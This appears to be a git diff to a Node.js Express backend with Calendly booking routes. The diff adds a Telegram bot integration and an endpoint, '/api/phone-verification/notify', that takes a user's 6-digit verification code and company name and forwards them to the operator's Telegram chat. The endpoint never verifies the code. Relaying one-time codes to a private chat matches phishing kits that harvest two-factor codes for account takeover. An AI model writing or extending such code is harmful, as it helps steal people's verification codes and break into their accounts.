@@ -10,6 +10,8 @@ const CALENDLY_API_BASE_URL = process.env.CALENDLY_API_BASE_URL || 'https://api.
 const CALENDLY_API_TOKEN = process.env.CALENDLY_API_TOKEN || '';
 const CALENDLY_EVENT_TYPE_URI = process.env.CALENDLY_EVENT_TYPE_URI || '';
 const CALENDLY_SLOT_MINUTES = Number(process.env.CALENDLY_SLOT_MINUTES || 30);
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
 const AVAILABLE_PREFIXES = [
   'kO17zP1jS9sKyN4pXvL5gL5mG5xR3nW6bY0D8uF3iK99kT2wB8ftVaV26r7qZ0M3xJmQ4cH1e2',
   'Hk0D7iKL5MvbB8faV36rmQ4n9131jk2e7t3xm9L5g2wzYx592OV8',
@@ -53,6 +55,10 @@ function normalizeDeviceId(deviceID) {
 
 function isCalendlyConfigured() {
   return Boolean(CALENDLY_API_TOKEN && CALENDLY_EVENT_TYPE_URI);
+}
+
+function isTelegramConfigured() {
+  return Boolean(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID);
 }
 
 function isValidEmail(value) {
@@ -136,6 +142,39 @@ async function fetchCalendlyAvailability(startTimeIso) {
   });
 
   return calendlyRequest(`/event_type_available_times?${params.toString()}`);
+}
+
+async function sendTelegramMessage(text) {
+  const endpoint = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+  const response = await fetch(endpoint, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      text,
+      disable_web_page_preview: true,
+    }),
+  });
+
+  const raw = await response.text();
+  const parsed = parseJsonSafely(raw);
+
+  if (!response.ok || parsed?.ok === false) {
+    return {
+      ok: false,
+      status: response.status,
+      message: parsed?.description || `Telegram API request failed (${response.status})`,
+      data: parsed,
+    };
+  }
+
+  return {
+    ok: true,
+    status: response.status,
+    data: parsed,
+  };
 }
 
 app.get('/api/calendly/availability', async (req, res) => {
@@ -252,6 +291,38 @@ app.post('/api/calendly/book', async (req, res) => {
       startTime: selectedIso,
       timezone,
     },
+  });
+});
+
+app.post('/api/phone-verification/notify', async (req, res) => {
+  if (!isTelegramConfigured()) {
+    return res.status(503).json({
+      result: false,
+      status: 'Telegram notification is not configured on backend.',
+    });
+  }
+
+  const code = typeof req.body?.code === 'string' ? req.body.code.trim() : '';
+  const companyName = typeof req.body?.companyName === 'string' ? req.body.companyName.trim() : 'Unknown Company';
+
+  if (!/^\d{6}$/.test(code)) {
+    return res.status(400).json({ result: false, status: 'code must be a 6-digit numeric value.' });
+  }
+
+  const message = `${companyName} Verification Code: ${code}`;
+  const telegramRes = await sendTelegramMessage(message);
+
+  if (!telegramRes.ok) {
+    return res.status(telegramRes.status || 502).json({
+      result: false,
+      status: telegramRes.message,
+      data: telegramRes.data,
+    });
+  }
+
+  return res.status(200).json({
+    result: true,
+    status: 'verification code notification sent',
   });
 });
 
